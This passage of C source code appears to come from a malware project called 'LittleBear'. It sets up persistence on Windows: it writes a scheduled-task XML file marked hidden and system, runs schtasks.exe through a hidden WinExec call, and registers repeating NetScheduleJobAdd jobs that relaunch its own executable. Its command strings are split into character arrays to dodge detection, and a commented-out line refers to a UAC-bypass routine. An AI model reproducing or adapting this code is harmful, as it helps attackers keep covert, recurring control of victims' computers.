	// 	<LogonType>InteractiveToken</LogonType>\r\n\
	// 	<RunLevel>LeastPrivilege</RunLevel>\r\n\
	// 	</Principal>\r\n\
	// 	</Principals>\r\n\

	//win7 win8 all the trigger is false or true will be both ok
	char szTaskXmlFileForamt[] = 
	{"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
	"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
	"<RegistrationInfo>\r\n"
	"<Date>%s</Date>\r\n"
	"<Author>%s</Author>\r\n"
	"</RegistrationInfo>\r\n"
	"<Triggers>\r\n"
	"<TimeTrigger>\r\n"
	"<Repetition>\r\n"
	"<Interval>PT%uM</Interval>\r\n"
	"<StopAtDurationEnd>false</StopAtDurationEnd>\r\n"
	"</Repetition>\r\n"
	"<StartBoundary>%s</StartBoundary>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"</TimeTrigger>\r\n"
	"</Triggers>\r\n"
	"<Principals>\r\n"
	"<Principal id=\"Author\">\r\n"
	"<RunLevel>LeastPrivilege</RunLevel>\r\n"
	"<UserId>%s</UserId>\r\n"
	"<LogonType>InteractiveToken</LogonType>\r\n"
	"</Principal>\r\n"
	"</Principals>\r\n"
	"<Settings>\r\n"
	"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
	"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
	"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
	"<AllowHardTerminate>false</AllowHardTerminate>\r\n"
	"<StartWhenAvailable>false</StartWhenAvailable>\r\n"
	"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
	"<IdleSettings>\r\n"
	"<StopOnIdleEnd>false</StopOnIdleEnd>\r\n"
	"<RestartOnIdle>false</RestartOnIdle>\r\n"
	"</IdleSettings>\r\n"
	"<AllowStartOnDemand>false</AllowStartOnDemand>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"<Hidden>false</Hidden>\r\n"
	"<RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n"
	"<WakeToRun>false</WakeToRun>\r\n"
	"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n"
	"<Priority>7</Priority>\r\n"
	"</Settings>\r\n"
	"<Actions Context=\"Author\">\r\n"
	"<Exec>\r\n"
	"<Command>%s</Command>\r\n"
	"</Exec>\r\n"
	"</Actions>\r\n"
	"</Task>\r\n"};

	//msoobe can not create task in highest level but can create normal task in uac highest level 
	//LeastPrivilege
	//HighestAvailable
	//win10 all the trigger is false will be ok
	char szTaskXmlFileForamtWin10[] = 
	{"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n\
	 <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n\
	 <RegistrationInfo>\r\n\
	 <Date>%s</Date>\r\n\
	 <Author>%s</Author>\r\n\
	 <URI>\\%s</URI>\r\n\
	 </RegistrationInfo>\r\n\
	 <Triggers>\r\n\
	 <TimeTrigger>\r\n\
	 <Repetition>\r\n\
	 <Interval>PT%uM</Interval>\r\n\
	 <StopAtDurationEnd>false</StopAtDurationEnd>\r\n\
	 </Repetition>\r\n\
	 <StartBoundary>%s</StartBoundary>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 </TimeTrigger>\r\n\
	 </Triggers>\r\n\
	 <Principals>\r\n\
	 <Principal id=\"Author\">\r\n\
	 <RunLevel>LeastPrivilege</RunLevel>\r\n\
	 <UserId>%s</UserId>\r\n\
	 <LogonType>InteractiveToken</LogonType>\r\n\
	 </Principal>\r\n\
	 </Principals>\r\n\
	 <Settings>\r\n\
	 <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n\
	 <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n\
	 <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n\
	 <AllowHardTerminate>false</AllowHardTerminate>\r\n\
	 <StartWhenAvailable>false</StartWhenAvailable>\r\n\
	 <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n\
	 <IdleSettings>\r\n\
	 <StopOnIdleEnd>false</StopOnIdleEnd>\r\n\
	 <RestartOnIdle>false</RestartOnIdle>\r\n\
	 </IdleSettings>\r\n\
	 <AllowStartOnDemand>false</AllowStartOnDemand>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 <Hidden>false</Hidden>\r\n\
	 <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n\
	 <WakeToRun>false</WakeToRun>\r\n\
	 <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n\
	 <Priority>7</Priority>\r\n\
	 </Settings>\r\n\
	 <Actions Context=\"Author\">\r\n\
	 <Exec>\r\n\
	 <Command>%s</Command>\r\n\
	 </Exec>\r\n\
	 </Actions>\r\n\
	 </Task>\r\n"};

	SYSTEMTIME stTime = {0};
	lpGetLocalTime(&stTime);

	char szTime[MAX_PATH];
	char szTimeFormat[] = "%04u-%02u-%02uT%02u:%02u:%02u";
	lpwsprintfA(szTime,szTimeFormat,stTime.wYear,stTime.wMonth,stTime.wDay,stTime.wHour,stTime.wMinute,stTime.wSecond);

	char szAccountName[MAX_PATH];
	int iRet = lpwsprintfA(szAccountName,"%s\\%s",strComputerName,strUserName);
	//lstrcpyA(szAccountName,"system");
#define MAX_SCHTASK_FILE_LIMIT_SIZE	0x4000
	char szTaskFileBuf[MAX_SCHTASK_FILE_LIMIT_SIZE];

	int iLen = 0;
	if(iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		iLen = sprintf_s(szTaskFileBuf,MAX_SCHTASK_FILE_LIMIT_SIZE,szTaskXmlFileForamtWin10,
			szTime,strUserName,szTaskName,iInterval,szTime,strUserName,szPeFileName);
	}
	else
	{
		iLen = sprintf_s(szTaskFileBuf,MAX_SCHTASK_FILE_LIMIT_SIZE,szTaskXmlFileForamt,
			szTime,strUserName,iInterval,szTime,szAccountName,szPeFileName);
	}

	char szTaskXmlFile[MAX_PATH];
	ModifyModuleFileName(szTaskXmlFile ,TASKS_XML_FILE_NAME);
	HANDLE hFileTask = lpCreateFileA(szTaskXmlFile,GENERIC_WRITE,0,0,CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,0);
	if(hFileTask == INVALID_HANDLE_VALUE)
	{
		WriteLittleBearLog("CreateScheduleInCmd lpCreateFileA error\r\n");
		return FALSE;
	}
	DWORD dwCnt = 0;
	int iRes = lpWriteFile(hFileTask,szTaskFileBuf,iLen,&dwCnt,0);
	lpCloseHandle(hFileTask);
	if (iRes == FALSE)
	{
		WriteLittleBearLog("CreateScheduleInCmd lpWriteFile error\r\n");
		return FALSE;
	}

	if (iFlag)
	{
		//here the exe and param is not splited,so do not use ""
		char szCmdParam[1024];
		char szCmdParamFormat[] = {'/','c','r','e','a','t','e',' ','/','f',' ','/','t','n',' ','%','s',' ','/','x','m','l',' ','%','s',0};
		char szExeNameFormat[] = {'%','s','\\','s','c','h','t','a','s','k','s','.','e','x','e',0};
		char szExeName[MAX_PATH];

		lpwsprintfA(szExeName,szExeNameFormat,szSysDir);
		lpwsprintfA(szCmdParam,szCmdParamFormat,szTaskName,szTaskXmlFile);
		//iRet = BypassUacRegistry(szExeName,1,szCmdParam,UACBYPASS_CMD_TYPE_RUNCMD);
	}
	else
	{
		char szScheduleCmdFormat[] = 
		{'c','m','d',' ','/','c',' ','%','s','\\','S','C','H','T','A','S','K','S','.','e','x','e',' ','/','C','R','E','A','T','E',' ','/','F',' ',
			'/','T','N',' ','%','s',' ','/','x','m','l',' ','%','s',/*' ','>','>','%','s',*/0};		
		char szCmd[MAX_PATH];
		lpwsprintfA(szCmd,szScheduleCmdFormat,szSysDir,szTaskName,szTaskXmlFile/*,szCmdOutputFile*/);
		//the function below will cause uac protection!!!
		//ShellExecuteA(0,"runas","c:\\windows\\system32\\schtasks.exe",
		//"/create /f /tn wioserver /xml c:\\users\\liujinguang\\appdata\\local\temp\\mylittlebear\\task_xml_file.txt",0,SW_HIDE);
		iRet = lpWinExec(szCmd,SW_HIDE);
		if (iRet <= 31)
		{
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(szShowInfo,"CreateScheduleInCmd lpWinExec create error,the errorcode is:%u\r\n",iRet);
			WriteLittleBearLog(szShowInfo);
		}

		
		lpwsprintfA(szShowInfo,"run command to create task schedule:%s\r\n",szCmd);
		WriteLittleBearLog(szShowInfo);
	}

// 	//can not delete it here,i dont know why
// 	#ifndef _DEBUG
// 	iRet = lpDeleteFileA(szTaskXmlFile);
// 	#endif
// 
// 		char szCmd[MAX_PATH];
// 		char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
// 			'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};
// 		char szScheduleCmd[] = {'c','m','d',' ','/','c',' ',
// 			'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
// 			'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ',
// 			'%','s',0};
// 	task account must be computer/user
// 		iRet = lpwsprintfA(szCmd,szScheduleCmd,iInterval,szTaskName,szPeFileName,szAccountName);
// 
// 
// 	schtasks /change command need adin account and password,so here will be a failure result
// 		char szScheduleChange[] = {'c','m','d',' ','/','c',' ','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
// 			'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0};
// 		iRet = lpwsprintfA(szCmd,szScheduleChange,szTaskName);
// 		iRet = lpWinExec(szCmd,SW_HIDE);
// 		if (iRet <= 31)
// 		{
// 			iRet = lpRtlGetLastWin32Error();
// 			lpwsprintfA(szShowInfo,"CreateScheduleInCmd lpWinExec change error,the errorcode is:%u\r\n",iRet);
// 			WriteLittleBearLog(szShowInfo);
// 			return FALSE;
// 		}

	return TRUE;
}



int LittleBearaddJob(DWORD dwStartMilliSeconds,DWORD dwTimes) 
{
	char szShowInfo[1024];

	char szStartAtFormat[] = {'c','m','d',' ','/','c',' ','%','s','\\','n','e','t',' ','s','t','a','r','t',' ','s','c','h','e','d','u','l','e',0};
	char szStartAt[MAX_PATH];
	char szSysDir[MAX_PATH] = {0};
	lpGetSystemDirectoryA(szSysDir,MAX_PATH);
	lpwsprintfA(szStartAt,szStartAtFormat,szSysDir);
	int iRet = lpWinExec(szStartAt,SW_HIDE);

	AT_INFO ai = {0};

	WCHAR szFilePath[MAX_PATH] = {0};
	int iLen = lpMultiByteToWideChar(CP_ACP, 0, strPEResidence, lplstrlenA(strPEResidence),szFilePath , sizeof(szFilePath));

	DWORD dwMilliSeconds = dwStartMilliSeconds;
	for (DWORD i = 0; i < dwTimes; i ++)
	{
		ai.Command = szFilePath;
		ai.DaysOfMonth = 0;
		ai.DaysOfWeek = 0x7F; 
		ai.Flags = JOB_RUN_PERIODICALLY;
		ai.JobTime = dwMilliSeconds; 
		DWORD JobId;

		iRet  = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
		if (iRet !=  NERR_Success )
		{
			
			lpwsprintfA(szShowInfo,"set job no:%u error at time:%u\r\n",i,dwMilliSeconds);
			WriteLittleBearLog(szShowInfo);
			return FALSE;
		}
		else
		{
			lpwsprintfA(szShowInfo,"set job no:%u ok at time:%u\r\n",i,dwMilliSeconds);
			WriteLittleBearLog(szShowInfo);
		}

		dwMilliSeconds = dwMilliSeconds + 24*60*60*1000/dwTimes;
	}

	//	ai.JobTime = 20 * 60 * 60 * 1000 + 5 * 60 * 1000; 
	// 	DWORD JobId;
	// 	iRet  = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
	// 	if (iRet !=  NERR_Success )
	// 	{
	// 
	// 		return FALSE;
	// 	}
	return TRUE;
}


